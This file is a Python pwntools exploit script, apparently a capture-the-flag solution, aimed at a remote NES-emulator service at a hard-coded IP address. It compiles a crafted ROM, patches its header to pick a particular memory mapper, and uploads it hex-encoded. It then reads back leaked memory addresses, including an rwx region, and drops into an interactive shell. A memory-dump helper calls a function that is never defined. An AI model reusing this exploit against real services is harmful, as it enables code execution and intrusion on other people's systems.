#!/usr/bin/env python

from pwn import *
from binascii import hexlify
import os

stop = 0x3F3280
offset = 0x3A0000 #checked up to 0x100000 on remote
r = 0

def spawn_remote():
    global r
    r = remote("91.107.157.58", 3000)
    #r = remote("localhost", 1337)

def leak():
    data = r.recvuntil(b"FF", drop=True).decode("utf-8").strip()
    if data:
        print(data)
    data = r.recvuntil(b"ABC",drop=True)
    return u64(data)

def dump():
    i = 0
    print(r.recvuntil(b"DD",drop=True))
    temp = r.recvuntil(b"EE",drop=True)
    print(len(temp))
    data = b''
    for i,b in enumerate(temp):
        if not i%2:
            data += b.to_bytes(1, 'little')

    i = 0
    print(len(data))
    while(i < 0x800):
        lol = u64(data[i:i+8])
        lol2 = u64(data[i+8:i+0x10])
        log.info(f'{hex(i+offset)}: {lol:#0{18}x} {lol2:#0{18}x}')
        if lol == 0x10000000b and lol2 == 0:
            bitch(1)
        i += 0x10

def templated(offset):
    log.info(f"offset: {hex(offset)}")
    pwn_code = ""
    with open("./rom/template.c", "r") as pwn:
        pwn_code = pwn.read()

    pwn_code = pwn_code.replace('XDOFFSET', f'{offset:#0{8}x}')

    with open("./rom/pwn.c", "w") as pwn:
        pwn.write(pwn_code)

def main():
    global r
    global offset
    #for remote enumeration
    #templated(offset)

    os.chdir("./rom")
    os.system("make all")
    os.chdir("..")
    spawn_remote()

    with open("./pwn.nes", "rb") as f:
        data = list(f.read())

        #patch in dream mapper
        data[6] = (data[6] & 0x0f) | (11 << 4) 

        to_send = hexlify(bytes(data))
        #log.info(f"sending data> {to_send}")

        r.sendlineafter(':\n', to_send)

        with open("./test.nes", "wb") as out:
            out.write(bytes(data))

        f.close()

    data = leak()
    log.info(f'rwx: {hex(data)}')
    data = leak()
    log.info(f'm_RAM: {hex(data)}')
    data = leak()
    log.info(f'm_RAM_rwx_off: {hex(data)}')
    #dump()
    r.interactive()
    r.close()
    offset += 0x800

if __name__ == "__main__":
    main()
#r.sendlineafter(b'GGGGG','ls')

